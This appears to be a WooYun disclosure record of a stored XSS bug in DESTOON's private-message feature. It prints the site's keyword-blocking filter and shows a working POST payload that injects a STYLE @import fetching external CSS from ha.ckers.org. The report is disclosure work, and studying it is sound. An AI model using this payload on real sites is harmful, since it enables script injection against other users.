{"id": 53808, "wybug_id": "wooyun-2014-066441", "wybug_title": "DESTOON 20140625版本站内信XSS", "wybug_corp": "DESTOON", "wybug_author": "jjf012", "wybug_date": "2014-06-27 17:30", "wybug_open_date": "2014-08-11 17:32", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向公众公开  简要描述： 只测试了ie6，弹了个框框。 详细说明：  \nfunction dsafe($string) {\tif(is_array($string)) {\t\treturn array_map('dsafe', $string);\t} else {\t\t$string = preg_replace(\"/\\<\\!\\-\\-([\\s\\S]*?)\\-\\-\\>/\", \"\", $string);\t\t$string = preg_replace(\"/\\/\\*([\\s\\S]*?)\\*\\//\", \"\", $string);\t\t$string = preg_replace(\"/&#([a-z0-9]+)([;]*)/i\", \"\", $string);\t\tif(preg_match(\"/&#([a-z0-9]+)([;]*)/i\", $string)) return nl2br(strip_tags($string));\t\t$match = array(\"/s[\\s]*c[\\s]*r[\\s]*i[\\s]*p[\\s]*t/i\",\"/d[\\s]*a[\\s]*t[\\s]*a/i\",\"/b[\\s]*a[\\s]*s[\\s]*e/i\",\"/e[\\\\\\]*x[\\\\\\]*p[\\\\\\]*r[\\\\\\]*e[\\\\\\]*s[\\\\\\]*s[\\\\\\]*i[\\\\\\]*o[\\\\\\]*n/i\",\"/on([a-z]{2,})([\\(|\\=|\\s]+)/i\",\"/about/i\",\"/frame/i\",\"/link/i\",\"/import/i\",\"/meta/i\",\"/textarea/i\",\"/eval/i\",\"/alert/i\",\"/confirm/i\",\"/prompt/i\",\"/cookie/i\",\"/document/i\",\"/newline/i\",\"/colon/i\",\"/\\\\\\x/i\");\t\t$replace = array(\"s<em></em>cript\",\"da<em></em>ta\",\"ba<em></em>se\",\"ex<em></em>pression\",\"o<em></em>n\\\\1\\\\2\",\"a<em></em>bout\",\"f<em></em>rame\",\"l<em></em>ink\",\"im<em></em>port\",\"me<em></em>ta\",\"text<em></em>area\",\"e<em></em>val\",\"a<em></em>lert\",\"/con<em></em>firm/i\",\"prom<em></em>pt\",\"coo<em></em>kie\",\"docu<em></em>ment\",\"new<em></em>line\",\"co<em></em>lon\",\"\\<em></em>x\");\t\treturn preg_replace($match, $replace, $string);\t}}\n翻译了一下。\"/script/\",\"/data/i\",\"/base/i\",\"/e[\\]*x[\\]*p[\\]*r[\\]*e[\\]*s[\\]*s[\\]*i[\\]*o[\\]*n/i\",\"/on([a-z]{2,})([\\(|\\=|\\s]+)/i\",\"/about/i\",\"/frame/i\",\"/link/i\",\"/import/i\",\"/meta/i\",\"/textarea/i\",\"/eval/i\",\"/alert/i\",\"/confirm/i\",\"/prompt/i\",\"/cookie/i\",\"/document/i\",\"/newline/i\",\"/colon/i\",\"/\\x/i\"然后发现了import没防\\\naction=send&typeid=-1&message%5Btouser%5D=destoon&message%5Btitle%5D=test123&message%5Bcontent%5D=<STYLE>%40imp\\ort'http%3a//ha.ckers.org/xss.css'%3b</STYLE> &message%5Bcopy%5D=1&submit=+%E7%A1%AE+%E5%AE%9A+\n   漏洞证明：  \n\n看sheet上是ie6到8都有效。   修复方案：  插入更多的反斜杠吧。   版权声明：转载请注明来源 jjf012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-06-27 20:05 厂商回复： 感谢反馈，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-27 17:46 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  IE6XSS也能上首页了……哭瞎了。。。我之前发的通杀destoon不上    \n     2014-06-27 18:01 |    \t\tjjf012 \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:10        )\t\t \n  @phith0n 也就ie6-8行了。国内ie6是特殊情况。    \n     2014-07-19 17:13 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @phith0n 不哭 继续努力,我是你忠诚的粉丝    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}